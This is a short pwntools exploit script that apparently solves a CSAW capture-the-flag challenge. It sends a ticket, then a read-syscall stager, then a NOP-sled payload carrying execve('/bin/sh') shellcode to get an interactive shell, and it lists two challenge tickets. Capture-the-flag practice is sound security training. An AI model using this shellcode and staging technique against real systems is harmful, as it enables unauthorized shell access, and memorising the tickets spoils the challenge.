#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

local_bin = "./chal2"
# libc = ELF("./libc-2.31.so")
elf = ELF(local_bin)
rop = ROP(elf)
context.log_level = "debug"

p = remote("how2pwn.chal.csaw.io", 60002)
# p = gdb.debug(local_bin, '''
#    b *0x55555555545E
#    continue
#    ''')


def sla(receive, reply):
    p.sendlineafter(receive, reply)


# shellcode = b'\x48\x8d\x3d\x0f\x00\x00\x00\x48\x31\xf6\x48\x31\xc0\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00'

shellcode = b"\x48\x31\xff\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05"

p.send(b"764fce03d863b5155db4af260374acc1")

p.sendlineafter(": \n", shellcode)

time.sleep(3)

shellcode2 = b"\x48\x8d\x3d\x0f\x00\x00\x00\x48\x31\xf6\x48\x31\xc0\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00"

payload = b"\x90" * 0x20
payload += shellcode2
p.sendline(payload)

p.interactive()


# ticket1: 764fce03d863b5155db4af260374acc1
# ticket2: 8e7bd9e37e38a85551d969e29b77e1ce
